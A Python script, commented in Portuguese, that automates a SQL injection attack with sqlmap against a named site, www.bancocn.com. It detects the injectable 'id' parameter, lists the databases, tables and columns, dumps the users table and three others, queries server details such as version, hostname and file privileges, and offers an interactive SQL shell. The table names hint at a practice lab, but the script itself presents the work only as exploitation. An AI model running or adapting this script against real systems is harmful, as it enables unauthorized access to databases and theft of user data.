#!/usr/bin/env python3
"""
Script de Exploração SQL Injection - BancoCN
Automatiza ataques SQL injection usando sqlmap
"""

import subprocess
import sys
import os
from typing import List, Tuple

# Configurações
URL = "http://www.bancocn.com/cat.php?id=1"
PARAM = "id"
DB = "bancocn"
TABLES = ["users", "pictures", "categories", "stats"]

# Cores para output
class Colors:
    RED = '\033[0;31m'
    GREEN = '\033[0;32m'
    YELLOW = '\033[1;33m'
    BLUE = '\033[0;34m'
    NC = '\033[0m'  # No Color

def print_header(text: str):
    """Imprime um cabeçalho formatado"""
    print(f"\n{Colors.GREEN}{'='*50}{Colors.NC}")
    print(f"{Colors.GREEN}{text}{Colors.NC}")
    print(f"{Colors.GREEN}{'='*50}{Colors.NC}\n")

def print_step(step: int, description: str):
    """Imprime uma etapa do processo"""
    print(f"{Colors.BLUE}[ETAPA {step}]{Colors.NC} {description}")

def print_info(text: str):
    """Imprime informação"""
    print(f"{Colors.YELLOW}[*]{Colors.NC} {text}")

def print_success(text: str):
    """Imprime sucesso"""
    print(f"{Colors.GREEN}[+]{Colors.NC} {text}")

def print_error(text: str):
    """Imprime erro"""
    print(f"{Colors.RED}[-]{Colors.NC} {text}")

def run_sqlmap(command: List[str], description: str, batch: bool = True) -> bool:
    """
    Executa um comando sqlmap
    
    Args:
        command: Lista de argumentos para sqlmap
        description: Descrição do que está sendo executado
        batch: Se True, adiciona --batch para não pedir confirmação
    
    Returns:
        True se executado com sucesso, False caso contrário
    """
    print_info(description)
    print_info(f"Executando: sqlmap {' '.join(command)}")
    print()
    
    cmd = ["sqlmap"] + command
    if batch and "--batch" not in cmd:
        cmd.append("--batch")
    
    try:
        result = subprocess.run(cmd, check=False)
        if result.returncode == 0:
            print_success("Comando executado com sucesso!")
        else:
            print_error(f"Comando retornou código {result.returncode}")
        print()
        return result.returncode == 0
    except FileNotFoundError:
        print_error("sqlmap não encontrado! Certifique-se de que está instalado.")
        return False
    except Exception as e:
        print_error(f"Erro ao executar comando: {e}")
        return False

def main():
    """Função principal"""
    print_header("Script de Exploração SQL Injection - BancoCN")
    print_info(f"Target: {URL}")
    print_info(f"Parâmetro: {PARAM}")
    print_info(f"Banco de dados: {DB}")
    print()
    
    # Verificar se sqlmap está instalado
    try:
        subprocess.run(["sqlmap", "--version"], 
                      capture_output=True, 
                      check=True)
    except (FileNotFoundError, subprocess.CalledProcessError):
        print_error("sqlmap não está instalado ou não está no PATH")
        print_info("Instale com: apt-get install sqlmap")
        sys.exit(1)
    
    # Etapa 1: Detecção inicial
    print_step(1, "Detecção de SQL Injection")
    run_sqlmap(
        ["-u", URL, "-p", PARAM, "--dbms=mysql"],
        "Detectando vulnerabilidade SQL Injection"
    )
    
    # Etapa 2: Listar bancos de dados
    print_step(2, "Listando bancos de dados")
    run_sqlmap(
        ["-u", URL, "-p", PARAM, "--dbs"],
        "Listando todos os bancos de dados"
    )
    
    # Etapa 3: Listar tabelas
    print_step(3, f"Listando tabelas do banco '{DB}'")
    run_sqlmap(
        ["-u", URL, "-p", PARAM, "-D", DB, "--tables"],
        f"Listando tabelas do banco {DB}"
    )
    
    # Etapa 4: Listar colunas da tabela users
    print_step(4, "Listando colunas da tabela 'users'")
    run_sqlmap(
        ["-u", URL, "-p", PARAM, "-D", DB, "-T", "users", "--columns"],
        "Listando colunas da tabela users"
    )
    
    # Etapa 5: Dump das tabelas
    print_step(5, "Fazendo dump das tabelas")
    for table in TABLES:
        run_sqlmap(
            ["-u", URL, "-p", PARAM, "-D", DB, "-T", table, "--dump"],
            f"Extraindo dados da tabela {table}"
        )
    
    # Etapa 6: Informações do sistema
    print_step(6, "Coletando informações do sistema")
    queries = [
        ("SELECT @@version", "Versão do MySQL"),
        ("SELECT @@hostname", "Hostname do servidor"),
        ("SELECT USER()", "Usuário atual"),
        ("SELECT DATABASE()", "Banco de dados atual"),
        ("SELECT @@secure_file_priv", "Permissões de arquivo"),
        ("SELECT @@datadir", "Diretório de dados"),
    ]
    
    for query, desc in queries:
        run_sqlmap(
            ["-u", URL, "-p", PARAM, "--sql-query", query],
            f"{desc}: {query}"
        )
    
    # Etapa 7: SQL Shell interativo
    print_step(7, "Abrindo SQL Shell interativo")
    print_info("Você pode executar queries SQL diretamente")
    print_info("Digite 'q' ou 'x' para sair")
    print()
    print("Exemplos de queries úteis:")
    print("  SELECT * FROM users;")
    print("  SELECT table_name FROM information_schema.tables WHERE table_schema='bancocn';")
    print("  SELECT column_name, data_type FROM information_schema.columns WHERE table_name='users';")
    print("  SELECT @@version;")
    print("  SELECT @@secure_file_priv;")
    print("  SELECT CURRENT_USER();")
    print()
    
    resposta = input("Deseja abrir o SQL shell interativo? (s/N): ").strip().lower()
    if resposta == 's':
        print()
        run_sqlmap(
            ["-u", URL, "-p", PARAM, "--sql-shell"],
            "Abrindo SQL shell",
            batch=False
        )
    
    print()
    print_success("Exploração concluída!")
    print_info("Dados salvos em: ~/.local/share/sqlmap/output/www.bancocn.com/")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print()
        print_info("Interrompido pelo usuário")
        sys.exit(0)

